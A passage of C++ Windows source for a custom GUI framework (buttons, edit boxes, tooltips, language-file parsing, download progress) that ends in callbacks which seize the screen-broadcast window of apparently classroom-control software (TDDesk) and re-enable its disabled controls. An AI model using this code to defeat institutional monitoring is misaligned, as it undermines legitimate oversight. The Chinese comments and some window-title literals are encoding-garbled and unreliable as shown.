			Check[CoverCheck].Value = !Check[CoverCheck].Value;
			Readd(REDRAW_CHECK, CoverCheck);
			Redraw(GetRECTc(CoverCheck));
		}
		Timer = GetTickCount();
		DestroyExp();//�ر�exp
	}
	bool TestInside()
	{
		POINT point = Main.GetPos();
		Main.EditGetNewInside(point);//��ͼԤ��ȷ��һ���Ƿ����ĳ���ؼ���
		Main.ButtonGetNewInside(point);//(����Ϊ�˾����Ƿ������϶�����)
		Main.CheckGetNewInside(point);
		Main.AreaGetNewInside(point);
		if (Main.CoverButton != -1 || Main.CoverCheck != 0 || Main.CoverEdit != 0 || Main.CoverArea != 0)return true;
		else return false;
	}
	void LeftButtonDown()//����������
	{
		POINT point = GetPos();
		if (CoverButton != -1)//����ť���� & ͣ���ڰ�ť��ʱ
		{
			Press = 1;//�ػ������ť
			ButtonRedraw(CoverButton);
		}
		if (!InsideEdit(CoverEdit, point) && CoverEdit != 0)
		{
			Edit[CoverEdit].Pos1 = Edit[CoverEdit].Pos2 = 0;
			const int TempCoverEdit = CoverEdit;//ԭ��һ��Edit������
			CoverEdit = 0;//�����������Ǹ�Edit����ʱ
			EditRedraw(TempCoverEdit);//��Ҫ��CoverEdit��Ϊ0;
			EditUnHotKey();//ȡ���ȼ�
		}
		if (EditPrv != 0)
		{//��������һ��Edit��ʱΪ�˸ı�߿����ɫ��ͬ����Ҫ�ػ�
			EditRedraw(EditPrv);
			EditPrv = 0;
		}
		if (CoverEdit != 0)//ͣ����Edit��ʱ~
			EditDown(CoverEdit);
		else EditUnHotKey();
#pragma warning(disable:28159)//GetTickCount��ÿ49�����һ��
		//��GetTickCount64����vista����֧��
		Timer = GetTickCount();//����exp�ļ�ʱ��
		DestroyExp();//�κβ������ᵼ��exp�Ĺر�
	}

	void CheckGetNewInside(POINT& point)//�������Ƿ����κ�Check��
	{//POINTΪ�����ʵ����
		for (int i = 1; i <= CurCheck; ++i)//��������Check
			if (Check[i].Page == CurWnd || Check[i].Page == 0)//����ͬһҳ�� -> ֱ������
				if (InsideCheck(i, point) != 0)//��Check�������л򷽿���
				{
					CoverCheck = i;//����CoverCheck
					if (Obredraw)Readd(REDRAW_CHECK, i);
					Redraw(GetRECTc(i));//�ػ�
					return;
				}
	}
	void ButtonGetNewInside(POINT& point)//�������Ƿ����κ�Button��
	{//POINTΪ�����ʵ����
		for (int i = 0; i <= CurButton; ++i)//��ʷԭ��Button����Ǵ�0��ʼ��
			if ((Button[i].Page == CurWnd || Button[i].Page == 0) && Button[i].Enabled && Button[i].DownTot == 0)
				if (InsideButton(i, point))//�ڰ�ť��
				{
					CoverButton = i;//����CoverButton
					if (ButtonEffect)//��Ч����
					{//�趨����ɫ
						Button[i].Percent += 3;//�ȸ�30%����ɫ ��̫���˿���������
						if (Button[i].Percent > 100)Button[i].Percent = 100;
					}
					ButtonRedraw(i);//�ػ�
					return;
				}
	}
	void AreaGetNewInside(POINT& point)//�������Ƿ����κ�ClickArea��
	{//POINTΪ�����ʵ����
		for (int i = 1; i <= CurArea; ++i)
			if (Area[i].Page == CurWnd || Area[i].Page == 0)
				if (InsideArea(i, point))
				{
					CoverArea = i;
					return;
				}
	}
	void EditGetNewInside(POINT& point)//�������Ƿ����κ�Edit��
	{//POINTΪ�����ʵ����
		for (int i = 1; i <= CurEdit; ++i)
			if (Edit[i].Page == CurWnd || Edit[i].Page == 0)
				if (InsideEdit(i, point))
				{
					EditPrv = CoverEdit;//��¼��֮ǰ��Edit���
					CoverEdit = i;
					return;
				}
	}
	void MouseMove()//����ƶ�
	{
		POINT point = GetPos();
		if (CoverButton == -1)ButtonGetNewInside(point);//ԭ�����ڰ�ť�� -> ���������Ƿ��ƽ���ť
		else//ԭ����
		{
			if (!Button[CoverButton].Enabled) { CoverButton = -1; goto disabled; }//�����ť��������  ֱ����������
			if ((Button[CoverButton].Page != CurWnd && Button[CoverButton].Page != 0) || !InsideButton(CoverButton, point))
			{//���ڲ���
				if (Obredraw)Readd(REDRAW_BUTTON, CoverButton);
				if (ButtonEffect)
				{//CoverButton��Ϊ-1 , �ػ�
					Button[CoverButton].Percent -= Delta;
					if (Button[CoverButton].Percent < 0)Button[CoverButton].Percent = 0;
				}
				const RECT rc = GetRECT(CoverButton);
				CoverButton = -1;
				Redraw(rc);
				ButtonGetNewInside(point);//�п��ܴ�һ����ťֱ���ƽ���һ����ť��
			}
		}
	disabled:
		if (CoverCheck == 0)CheckGetNewInside(point);//������ -> Ѱ����check
		else
		{//ͬ��
			if ((Check[CoverCheck].Page != CurWnd && Check[CoverCheck].Page != 0) || InsideCheck(CoverCheck, point) == 0)
			{
				if (Obredraw)Readd(REDRAW_CHECK, CoverCheck);
				const RECT rc = GetRECTc(CoverCheck);
				CoverCheck = 0;
				Redraw(rc);
				CheckGetNewInside(point);
			}
		}
		if (CoverEdit != 0 && Edit[CoverEdit].Press == TRUE)
		{
			//���Edit������ (ͬʱ���϶�ѡ����)
			const int t = Edit[CoverEdit].Pos2;
			Edit[CoverEdit].Pos2 = GetNearestChar(CoverEdit, point);//Ѱ�Һ����ָ��������ַ�
			RefreshCaretByPos(CoverEdit);//�ƶ�Caret(��˸�Ĺ��)
			if (Edit[CoverEdit].Pos2 == Edit[CoverEdit].Pos1) { Edit[CoverEdit].Pos2 = -1; goto end; }//ֻѡ����һ���ַ�
			if (Edit[CoverEdit].Pos2 != t && Edit[CoverEdit].Width < Edit[CoverEdit].strWidth && !InsideEdit(CoverEdit, point))RefreshXOffset(CoverEdit);//Edit���ı��������ƶ����˿�����
			if (Edit[CoverEdit].Pos2 != t)EditRedraw(CoverEdit);//ֻҪ��ԭ�����κβ�ͬ���ػ�
		}
	end:
		if (CoverArea == 0)
			AreaGetNewInside(point);
		else
			if (!InsideArea(CoverArea, point))CoverArea = 0;

		if (Msv == 0)
		{
			TRACKMOUSEEVENT tme;
			tme.cbSize = sizeof(tme);//�������ƽ��Ƴ��ĺ���
			tme.hwndTrack = hWnd;//������Ƴ�����ʱ�ᴥ��һ��WM_LEAVE��Ϣ������������Ըı䰴ť��ɫ
			tme.dwFlags = TME_LEAVE;//ȱ���ǵ�����ֱ�ӱ���һ�����ڶ�ȡʱ(���簴��windows��)
			TrackMouseEvent(&tme);//ʲô��Ӧ��û��
			Msv = 1;//�Ƴ�
		}
		else Msv = 0;//�ƽ�
		if (point.x != ExpPoint2.x || point.y != ExpPoint2.y)
		{//����ƶ�ʱ����Exp
			ExpPoint2 = point;
			Timer = GetTickCount();//����exp��ʱ��
			DestroyExp();
		}
	}
	void EditRedraw(int cur)//�ػ�Edit����Ǻ���
	{
		if (Obredraw)Readd(REDRAW_EDIT, cur);
		Redraw(GetRECTe(cur));//��׼ObjectRedrawд��
	}
	void ButtonRedraw(int cur)//�ػ�Button����Ǻ���
	{
		if (Obredraw)Readd(REDRAW_BUTTON, cur);
		Redraw(GetRECT(cur));//��׼ObjectRedrawд��
	}
	BOOL YesNoBox(LPCWSTR Str)
	{
		return MessageBox(hWnd, GetStr(Str), GetStr(L"Info"), MB_ICONINFORMATION | MB_OKCANCEL) == IDOK;
	}
	void InfoBox(LPCWSTR Str)//ȫ�Զ���MessageBox
	{
		const wchar_t* GUIStrExist = GetStr(Str);
		if (!slient)//���Str����GUIstr��ID���ӡstr�����ݣ�����ֱ�Ӵ�ӡStr
		{
			if (noMsgbox) {//����������MessageBoxʱֱ����TextOut��ʽ��ӡ��������
				if (GUIStrExist)TextOut(hdc, 200, 55, GetStr(Str), (int)mywcslen(GetStr(Str))); else TextOut(hdc, 200, 55, Str, (int)mywcslen(Str));
			}
			else {
				if (GUIStrExist)MessageBox(hWnd, GetStr(Str), GetStr(L"Info"), 0x40L); else MessageBox(hWnd, Str, GetStr(L"Info"), 0x40L);
			}
		}
		else
		{
			wchar_t ConsoleTemp[MAX_STR];
			mywcscpy(ConsoleTemp, GetStr(L"TDT"));
			if (GUIStrExist)mywcscat(ConsoleTemp, GetStr(Str)); else mywcscat(ConsoleTemp, Str);
			WriteConsole(hdlWrite, ConsoleTemp, (DWORD)mywcslen(ConsoleTemp), nullptr, nullptr);
			WriteConsole(hdlWrite, L"\n", 2, nullptr, nullptr);
		}//��ӡ����������
	}
	void RefreshXOffset(int cur)//���¼���Edit��Xoffset
	{
		if (Edit[cur].strWidth < Edit[cur].Width * DPI) {
			Edit[cur].XOffset = 0; return;//���Edit������̫�٣�XOffsetֱ��Ϊ0���˳�
		}
		SIZE se;

		if (Edit[cur].Pos2 != -1)
			MyGetTextExtentPoint32(cur, -1, Edit[cur].Pos2 - 1, se);//���㳤��
		else
			MyGetTextExtentPoint32(cur, -1, Edit[cur].Pos1 - 1, se);//���㳤��	���̱Ƚϸ��ӣ���ԭ���
		if (se.cx < Edit[cur].XOffset)Edit[cur].XOffset = se.cx - 1;
		if (se.cx > (long)(Edit[cur].XOffset + Edit[cur].Width * DPI))Edit[cur].XOffset += (int)(se.cx - (Edit[cur].XOffset + Edit[cur].Width * DPI) - 1);
		if (Edit[cur].strWidth - Edit[cur].XOffset < Edit[cur].Width * DPI)Edit[cur].XOffset = (int)(Edit[cur].strWidth - Edit[cur].Width * DPI);
		RefreshCaretByPos(cur);
		EditRedraw(cur);
	}
	void SetPage(int newPage)//���ô��ڵ�ҳ��
	{
		if (newPage == CurWnd)return;//���˵�ǰҳ�İ�ť��ֱ���˳�
		/*EnableButton(CurWnd, true);
		EnableButton(newPage, false);*/
		HideCaret(hWnd);//��ҳʱ�Զ�������˸�Ĺ��
		ShowCrt = FALSE;
		Edit[CoverEdit].Press = FALSE;
		Edit[CoverEdit].Pos1 = Edit[CoverEdit].Pos2 = -1;
		CoverEdit = 0;//ȡ��Edit��ѡ��
		CurWnd = newPage;
		Redraw();//�л�ҳ��ʱ��Ȼ��Ҫȫ���ػ���
	}
	void SetDPI(float NewDPI)//�ı䴰�ڵ����Ŵ�С
	{//						(����ĳ��ʷԭ�����Ŵ�С�ı���������������DPI)
		if (DPI == NewDPI)return;
		DPI = NewDPI;//�����´�С������
		if (DefFont)DeleteObject(DefFont);
		DefFont = CreateFontW(max((int)(16 * DPI), 8), max((int)(8 * DPI), 4), 0, 0, FW_THIN, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"����");

		for (int i = 1; i <= CurEdit; ++i)SetEditStrOrFont(0, DefFont, i), RefreshXOffset(i);//��������
		RefreshCaretByPos(CoverEdit);
		if (Width != 0 && Height != 0)SetWindowPos(hWnd, NULL, 0, 0, (int)(Width * DPI - 0.5), (int)(Height * DPI - 0.5), SWP_NOMOVE | SWP_NOREDRAW);

		DestroyCaret();//������˸�Ĺ��
		CreateCaret(hWnd, NULL, 1, (int)(20 * DPI));
		Redraw();
	}

	LPWSTR GetCurInsideID(POINT& point)//��ȡ��ǰ��괦�ڵİ�ť��ID
	{
		for (int i = 0; i <= CurButton; ++i)
			if ((Button[i].Page == CurWnd || Button[i].Page == 0) && Button[i].Enabled)
				if (InsideButton(i, point) && Button[i].DownTot == 0)
					return Button[i].ID;//����ID
		return Button[0].ID;//����һ����ֵ
	}

	void EnableButton(int cur, BOOL enable)
	{
		Button[cur].Enabled = enable;
		if (Button[cur].Page == CurWnd || Button[cur].Page == 0)ButtonRedraw(cur);
	}
	byte* pvBits;
	void WindowPreparation(int MaxWidth, int MaxHeight)//��Ҫ���ƵĴ�������˫����hdc��bitmap
	{
		tdc = GetDC(hWnd);
		hdc = CreateCompatibleDC(tdc);
		//Bitmap = CreateCompatibleBitmap(tdc, MaxWidth, MaxHeight);


		BITMAPINFO bmi;        // bitmap header

		ZeroMemory(&bmi, sizeof(BITMAPINFO));
		bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmi.bmiHeader.biWidth = MaxWidth;
		bmi.bmiHeader.biHeight = MaxHeight;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biBitCount = 24;         // four 8-bit components
		bmi.bmiHeader.biCompression = BI_RGB;
		bmi.bmiHeader.biSizeImage = MaxWidth * MaxHeight * 3;
		Bitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pvBits, NULL, 0);

		if (Bitmap != 0)SelectObject(hdc, Bitmap);
		ReleaseDC(hWnd, tdc);
		if (EditBitmap != NULL)DeleteObject(EditBitmap);//��Edit����һ��Bitmap
		EditBitmap = CreateCompatibleBitmap(hdc, MAX_EDIT_WIDTH, MAX_EDIT_HEIGHT);
		//ReleaseDC(hWnd,hdc);
	}
	void Try2CreateExp()//���Խ���һ��Exp�����ݲ�׼�����ڻ���
	{
		SIZE se;
		if (ExpExist == TRUE || CoverButton == -1)return;//���Exp�Ѿ����ڻ�����Ϊ�գ���ô��ֱ���˳�
		if (Button[CoverButton].Exp == 0)return;
		if (*Button[CoverButton].Exp == 0)return;
		ExpExist = TRUE;
		ExpLine = 0;//����
		myZeroMemory(Exp, sizeof(Exp));
		wchar_t* x = Button[CoverButton].Exp, * y = Button[CoverButton].Exp;
		ExpHeight = 8;
		ExpWidth = 0;
		while (1)
		{
			++ExpLine;
			x = mywcsstr(x + 1, L"\\n");//��Exp���ַ�����Ѱ��\n�ַ�
			if (x != 0)x[0] = 0;//Ȼ��洢��һ����ά������
			if (ExpLine == 1)mywcscpy(Exp[ExpLine], y); else mywcscpy(Exp[ExpLine], y + 2);
			if (ExpLine == 1)GetTextExtentPoint32(hdc, y, (int)mywcslen(y), &se); else GetTextExtentPoint32(hdc, y + 2, (int)mywcslen(y + 2), &se);//��ȡ�ַ����Ŀ��
			if (x != 0)x[0] = '\\';
			ExpHeight += (se.cy + 2);//�������Exp�Ŀ�͸�
			ExpWidth = max(ExpWidth - 8, se.cx) + 8;
			if (x == 0)break;
			y = x;
		}
		ExpPoint = GetPos();
		if (ExpPoint.x > (int)((float)Width * DPI / (float)2.0))ExpPoint.x -= (ExpWidth + 6); else ExpPoint.x += 12;//�Զ�ѡ��ע�͵�λ��
		if (ExpPoint.y > (int)((float)Height * DPI / (float)2.0))ExpPoint.y -= (ExpHeight + 6); else ExpPoint.y += 14;//��ֹ��ӡ����������
		RECT rc{ ExpPoint.x, ExpPoint.y, ExpPoint.x + ExpWidth, ExpPoint.y + ExpHeight + 2 };//ע�������ExpPoint�ȶ�����ʵ����
		Readd(REDRAW_EXP, 1);
		Redraw(rc);
	}
	void DestroyExp()//������Exp
	{
		if (!ExpExist)return;
		ExpExist = FALSE;//ɾ��ExpʱҪ�������Exp����Ŀؼ���������ƺ��鷳���ɴ��ȫ��ˢ��һ�°�
		RECT rc{ ExpPoint.x, ExpPoint.y, ExpPoint.x + ExpWidth, ExpPoint.y + ExpHeight + 2 };
		es[++es[0].top] = rc;
		Redraw(rc);
		ExpLine = ExpHeight = ExpWidth = 0;//ע��:ExpWidth��ֵһ��Ҫ��ʹ�������
	}
	void Redraw(const RECT& rc) { InvalidateRect(hWnd, &rc, FALSE), UpdateWindow(hWnd); }//�Զ��ػ� & ˢ��ָ������
	void Redraw() {
		rs[0].first = es[0].top = 0;
		InvalidateRect(hWnd, nullptr, FALSE);
		UpdateWindow(hWnd);
	}//���Ҫˢ�µĿؼ�~
	void Readd(int type, int cur) { rs[++rs[0].first] = { type,cur }; }//1=Frame,2=Button,3=Check,4=Text,5=Edit


	BOOL GetLanguage(GETLAN& getlan)//��һ�����ֽ����ɿ��õ���Ϣ
	{//��Щ�������Ǵ��볤��ԭ��򵥣����û��ע��
		wchar_t* str1 = mywcsstr(getlan.begin, L"\"");
		if (str1 == 0)return false;
		wchar_t* str2 = mywcsstr(str1 + 1, L"\"");
		if (str2 == 0) goto error;
		*str2 = 0;
		getlan.str1 = str1 + 1;//Name
		str1 = mywcsstr(str2 + 1, L",");
		if (str1 == NULL)return TRUE;//Left
		str2 = mywcsstr(str1 + 1, L",");
		if (str2 != NULL)*str2 = 0;
		getlan.Left = mywtoi(str1 + 1);//Top
		if (str2 == NULL)return TRUE;
		str1 = mywcsstr(str2 + 1, L",");//Width
		if (str1 != NULL)*str1 = 0;
		getlan.Top = mywtoi(str2 + 1);
		if (str1 == NULL)return TRUE;
		str2 = mywcsstr(str1 + 1, L",");//Height
		if (str2 != NULL)*str2 = 0;
		getlan.Width = mywtoi(str1 + 1);
		if (str2 == NULL)return TRUE;
		str1 = mywcsstr(str2 + 1, L",");
		if (str1 != NULL)*str1 = 0;
		getlan.Height = mywtoi(str2 + 1);
		if (str1 == 0)return TRUE;
		str1 = mywcsstr(str1 + 1, L"\"");//Str
		if (str1 == 0)goto error;
		str2 = mywcsstr(str1 + 1, L"\"");
		if (str2 == 0)goto error;
		*str2 = 0;
		getlan.str2 = str1 + 1;
		return TRUE;
	error:
		InfoBox(L"unk");
		return FALSE;
	}
	void DispatchLanguage(LPWSTR ReadTmp, int type)
	{//�������ļ��ж�ȡ����һ�����õ�Class��
		wchar_t Readm[MAX_STR + 100];
		mywcscpy(Readm, ReadTmp);
		GETLAN gl = { 0 };
		//myZeroMemory(&gl, sizeof(GETLAN));
		wchar_t* pos = mywcsstr(Readm, L"=");
		if (pos == 0)return;
		*pos = 0; gl.begin = pos + 1;
		wchar_t* space = mywcsstr(Readm, L" ");
		if (space != 0)*space = 0;//�ֲ�ͬ�Ŀؼ�����

		if (type == 1)//button
		{
			int cur = but[Hash(Readm)];
			if (!GetLanguage(gl))goto error;
			if (gl.Left != -1)Button[cur].Left = gl.Left;
			if (gl.Top != -1)Button[cur].Top = gl.Top;
			if (gl.Width != -1)Button[cur].Width = gl.Width;
			if (gl.Height != -1)Button[cur].Height = gl.Height;
			if (gl.str1 != NULL)mywcscpy(Button[cur].Name, gl.str1);
			if (Button[cur].Exp != nullptr)if (*Button[cur].Exp != NULL)
			{
				HeapFree(GetProcessHeap(), 0, Button[cur].Exp);
				Button[cur].Exp = 0;
			}
			if (gl.str2 != NULL)
			{
				Button[cur].Exp = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, sizeof(wchar_t) * (mywcslen(gl.str2) + 1));
				mywcscpy(Button[cur].Exp, gl.str2);
			}
			return;
		}
		if (type == 2)//check
		{
			int cur = mywtoi(Readm + 1);
			if (!GetLanguage(gl))goto error;
			if (gl.Left != -1)Check[cur].Left = gl.Left;
			if (gl.Top != -1)Check[cur].Top = gl.Top;
			if (gl.Width != -1)Check[cur].Width = gl.Width;
			if (gl.str1 != NULL)mywcscpy(Check[cur].Name, gl.str1);
			return;
		}
		if (type == 3)//string
		{
			wchar_t tmp[MAX_STR]; BOOL f = FALSE;
			myZeroMemory(tmp, sizeof(wchar_t) * 256);
			//mywcscpy(tmp2, gl.begin);

			wchar_t* str1 = mywcsstr(pos + 1, L"\""), * str2, * str3;
			if (str1 == 0)goto error;
			str2 = str1;
			str3 = str2 + 1;
			while (1)
			{
				str2 = mywcsstr(str2, L"\\n");
				if (str2 == NULL)break;
				f = TRUE;
				*str2 = 0;
				mywcscat(tmp, str3);
				mywcscat(tmp, L"\n");
				str3 = str2 + 2;
				str2 = str2 + 1;
			}
			if (f == FALSE)
				str2 = mywcsstr(str1 + 1, L"\"");
			else
				str2 = mywcsstr(str3, L"\"");
			if (str2 == NULL)goto error;
			*str2 = 0;
			mywcscat(tmp, str3);
			SetStr(tmp, Readm);
			return;
		}
		if (type == 4)//frame
		{
			int cur = mywtoi(Readm + 1);
			if (!GetLanguage(gl))goto error;
			if (gl.Left != -1)Frame[cur].Left = gl.Left;
			if (gl.Top != -1)Frame[cur].Top = gl.Top;
			if (gl.Width != -1)Frame[cur].Width = gl.Width;
			if (gl.Height != -1)Frame[cur].Height = gl.Height;
			if (gl.str1 != NULL)mywcscpy(Frame[cur].Name, gl.str1);
			return;
		}
		if (type == 5)//text
		{
			int cur = mywtoi(Readm + 1);
			wchar_t* tmpstr = mywcsstr(pos + 1, L",");
			if (tmpstr == 0)goto error;
			*tmpstr = 0;
			const int NewLeft = mywtoi(pos + 1);
			const int NewTop = mywtoi(tmpstr + 1);
			if (NewLeft != -1)Text[cur].Left = NewLeft;
			if (NewTop != -1)Text[cur].Top = NewTop;
			return;
		}
		if (type == 6)//edit
		{
			int cur = mywtoi(Readm + 1);
			if (!GetLanguage(gl))goto error;
			if (gl.Left != -1)Edit[cur].Left = gl.Left;
			if (gl.Top != -1)Edit[cur].Top = gl.Top;
			if (gl.Width != -1)Edit[cur].Width = gl.Width;
			if (gl.Height != -1)Edit[cur].Height = gl.Height;
			if (gl.str1 != NULL && Edit[cur].strLength == 0)mywcscpy(Edit[cur].OStr, gl.str1);
			return;
		}//��Ȼ�ǳ���ԭ��򵥵Ĵ���

		return;
	error:
		wchar_t tmpstr[MAX_STR];
		mywcscpy(tmpstr, L"error:");
		mywcscat(tmpstr, Readm);
		InfoBox(tmpstr);
		return;
	}

	void DrawTitleBar()
	{
		SelectObject(hdc, TitleBar.hPen);
		SelectObject(hdc, TitleBar.hBrush);
		Rectangle(hdc, 0, 0, (int)(DPI * Width + 1), (int)(DPI * TitleBar.Height));
	}
	void SetTitleBar(int newColor, int newHeight)
	{
		if (TitleBar.hPen)DeleteObject(TitleBar.hPen);
		if (TitleBar.hBrush)DeleteObject(TitleBar.hBrush);
		TitleBar.hPen = CreatePen(PS_SOLID, 1, newColor);
		TitleBar.hBrush = CreateSolidBrush(newColor);
		TitleBar.Height = newHeight;
		TitleBar.col = newColor;
	}

	//
	//������Class�ı���
	//

	struct TitleEx
	{
		HPEN hPen; HBRUSH hBrush; int Height; COLORREF col;
	}TitleBar;
	struct ButtonEx//��ť
	{
		long Left, Top, Width, Height, Page, Download, Percent, DownCur, DownTot;
		BOOL Enabled, Shadow;
		HBRUSH Leave, Hover, Press;//�뿪 and ���� and ����
		HPEN Leave2, Hover2, Press2;
		HFONT Font;
		wchar_t Name[31], ID[MAX_ID], * Exp;
		COLORREF FontRGB;
		BYTE b1[3], b2[3], p1[3], p2[3];
	}Button[MAX_BUTTON];//ֻ�а�ťʹ����ID
	struct FrameEx//�ؼ���ṹ��
	{
		int Left, Top, Width, Height, Page;
		COLORREF rgb;//�Զ�����ɫ
		wchar_t Name[51];
	}Frame[MAX_FRAME];//����Ϊ�˽�Լ�ڴ�ռ䶼��MAX_XXX�� �� ������Ե�GUI.h���
	struct CheckEx//ѡ���ṹ��
	{
		int Left, Top, Page, Width;//width�������޹أ���������Ƿ���
		BOOL Value;
		wchar_t Name[51];
	}Check[MAX_CHECK];
	struct LineEx//�߶�
	{
		int StartX, StartY, Length, Page;//�߶ε���ʼ������յ�����
		BOOL Focus;
		COLORREF Color;
	}Line[MAX_LINE];
	struct TextEx//����
	{
		int Left, Top, Page;
		COLORREF rgb;
		wchar_t Name[MAX_ID];//�����"Name"��ʵ��GUIString��ID
	}Text[MAX_TEXT];
	struct EditEx//�����
	{
		int Left, Top, Width, Height, Page;
		int strWidth, strHeight, Pos1, Pos2, XOffset, strLength;
		int* strW;
		BOOL Press;
		wchar_t* str, OStr[21];
		HFONT font;
	}Edit[MAX_EDIT];
	struct ClickAreaEx//�������
	{
		int Left, Top, Width, Height, Page;
	}Area[MAX_AREA];

	int ExpLine, ExpHeight, ExpWidth;//����Explaination�ļ�������
	wchar_t Exp[MAX_EXPLINES][MAX_EXPLENGTH];
	POINT ExpPoint, ExpPoint2;
	BOOL ShowExp;//Exp�Ƿ���ʾ
	DWORD Timer;//Exp������ʱ��
	BOOL ExpExist;//Exp�Ƿ����

	Map<unsigned int, wchar_t*> str;//�ַ�����ID ->���(��������)
	Map<unsigned int, int>but;//Button��ID -> ���
	HFONT DefFont;//Ĭ�ϵ�����
	int Msv;//����Ƴ�������
	int CurString, CurButton, CurFrame, CurCheck, CurLine, CurText, CurEdit, CurArea;//���ֿؼ�������
	float DPI;//���Ŵ�С
	int CoverButton, CoverCheck, CoverEdit, CoverArea;//��ǰ����긲�ǵĶ���
	BOOL Obredraw;//�Ƿ�����ObjectRedraw���� - Ĭ�Ͽ���
	BOOL ButtonEffect;//�Ƿ�������ɫ
	int CurWnd;//��ǰ��ҳ��
	int Press;//�������Ƿ���
	POINT CaretPos;//��˸�Ĺ���λ��
	BOOL ShowCrt;//�Ƿ���ʾ��˸�Ĺ��
	BOOL noMsgbox;//�Ƿ���ʾ��Ϣ��ӡ�ڽ����ϣ������ǵ���MessageBox
	Mypair rs[MAX_RS];//�ػ��б� 1=Frame,2=Button,3=Check,4=Text,5=Edit
	RECT es[MAX_ES];//�����б�
	HDC hdc, tdc;//���� and ��ʵdc
	HBITMAP EditBitmap;//Editר�û���bitmap
	HBITMAP Bitmap;//���洰��bitmap
	int Width, Height;//���ڵĿ�͸�
	HWND hWnd;//Class���ƵĴ����hwnd
	HINSTANCE hInstance;//�����hInst
	int EditPrv;//֮ǰ�������edit���

	//û���κ�private��������= =
}Main;

//Class����������
//�����Ǹ��ֺ���

#pragma warning(default:26495)
#pragma warning(disable:4100)//���þ���
class DownloadProgress : public IBindStatusCallback {
public://��Щ��������Щ����û���õ����ᵼ�´�������.
	int curi;/*�������ؽ�����Ϣ�İ�ť���*/ int factmax;//�ֶ����ñ������ļ�����ʵ��С
	HRESULT __stdcall QueryInterface(const IID&, void**) { return E_NOINTERFACE; }
	ULONG STDMETHODCALLTYPE AddRef() { return 1; }//��ʱû�õĺ�������msdn�ϳ�������
	ULONG STDMETHODCALLTYPE Release() { return 1; }
	HRESULT STDMETHODCALLTYPE OnStartBinding(DWORD dwReserved, IBinding* pib) { return E_NOTIMPL; }
	HRESULT STDMETHODCALLTYPE GetPriority(LONG* pnPriority) { return E_NOTIMPL; }
	HRESULT STDMETHODCALLTYPE OnLowResource(DWORD reserved) { return S_OK; }
	HRESULT STDMETHODCALLTYPE OnStopBinding(HRESULT hresult, LPCWSTR szError) { return E_NOTIMPL; }
	HRESULT STDMETHODCALLTYPE GetBindInfo(DWORD* grfBINDF, BINDINFO* pbindinfo) { return E_NOTIMPL; }
	HRESULT STDMETHODCALLTYPE OnDataAvailable(DWORD grfBSCF, DWORD dwSize, FORMATETC* pformatetc, STGMEDIUM* pstgmed) { return E_NOTIMPL; }
	HRESULT STDMETHODCALLTYPE OnObjectAvailable(REFIID riid, IUnknown* punk) { return E_NOTIMPL; }
	HRESULT __stdcall OnProgress(ULONG ulProgress, ULONG ulProgressMax, ULONG ulStatusCode, LPCWSTR szStatusText)
	{
		if (ulProgressMax != 0)//ulProgress�������ص��ֽ���
		{//ulProgressMax�����ֽ���
			float percentage;
			if (factmax == 0) percentage = (float)ulProgress / (float)ulProgressMax * 100;//�������ذٷֱ�
			else  percentage = (float)ulProgress / (float)factmax * 100;//ע�⣡��ʱ�����޷��õ���ȷ��ulProgressMax����Ȼû������
			if (Main.Button[curi].Download != (int)percentage + 1)//percentage�Ի����100%������һϵ�д���
			{//																		��ʱ��Ӧ���������ļ�����ȷ��С(factmax)
				Main.Button[curi].Download = (int)percentage + 1;
				Main.ButtonRedraw(curi);
			}
		}
		return S_OK;
	}
};

BOOL CALLBACK EnumChildwnd(HWND hwnd, LPARAM lParam)//����"��Ļ�㲥"�Ӵ��ڵ�ö�ٺ���.
{
	if (lParam == 1)//lParam == 1������"һ����װ"���ü�������а�ť
	{//2016�漫��㲥�������Ͻ���һ��������ȫ���㲥�İ�ť��Ĭ�Ͻ���
		EnableWindow(hwnd, TRUE);//�������ú󣬾����ֶ����ڻ��㲥��
		return CONTINUE_SEARCH;
	}
	if (!IsWindowVisible(hwnd))return CONTINUE_SEARCH;//����2015��2016�汾�Ĺ㲥���ڲ��ǵ�һ�ģ�
	wchar_t title[MAX_STR];//����������ȫ���������滹��TDDesk Render Window(�㲥���ݴ���)�͹��������ڡ�
	GetWindowText(hwnd, title, MAX_STR);//����ö�ټ���㲥���ڵ��Ӵ��ڣ��ҵ�TDDesk Render Window����¼������
	if (mywcsstr(title, L"TDDesk Render Window") != 0)//Ȼ��׽��CatchWnd����ȥ
	{
		SetParent(hwnd, CatchWnd);
		++EatList[0];//ע��HWND���͵ı���ֵһ������4�ı���
		EatList[(size_t)(EatList[0]) / 4] = hwnd;//����HWND a=0;++a;�õ���ֵΪ4
		TDhWndChild = hwnd;
		return STOP_SEARCH;
	}
	return CONTINUE_SEARCH;
}
BOOL CALLBACK EnumAllBroadcastwnds(HWND hwnd, LPARAM lParam)//���Ҽ���"��Ļ�㲥"���ڵ�ö�ٺ���(����һ����װ)
{
	if (!IsWindowVisible(hwnd))return CONTINUE_SEARCH;
	wchar_t title[MAX_STR];
	GetWindowText(hwnd, title, MAX_STR);
	if (mywcsstr(title, L"��Ļ�㲥") != 0 || mywcsstr(title, L"��Ļ�ݲ��Ҵ���") != 0 || mywcsstr(title, L"��Ļ�㲥����") != 0)
	{
		EnumChildWindows(hwnd, EnumChildwnd, 1);
		return CONTINUE_SEARCH;
	}
	return CONTINUE_SEARCH;
}
BOOL CALLBACK EnumBroadcastwnd(HWND hwnd, LPARAM lParam)//����"��Ļ�㲥"���ڵ�ö�ٺ���.
{
	if (!IsWindowVisible(hwnd))return CONTINUE_SEARCH;
	wchar_t title[MAX_STR];
	GetWindowText(hwnd, title, MAX_STR);
	if (mywcsstr(title, L"��Ļ�㲥") != 0)//ö�ټ���㲥����
	{//(2015��2016�м���㲥����һ���"��Ļ�㲥"���������Ƕ����Եģ���Ӣ��ϵͳ�Ͽ��ܻ������)
		EnumChildWindows(hwnd, EnumChildwnd, NULL);
		if (FS) { FS = FALSE; MyRegisterClass(hInst, ScreenProc, ScreenWindow, NULL); }
		TDhWndGrandParent = CreateWindow(ScreenWindow, L"You can't see me.", WS_POPUP, 0, 0, 100, 100, nullptr, nullptr, hInst, nullptr);
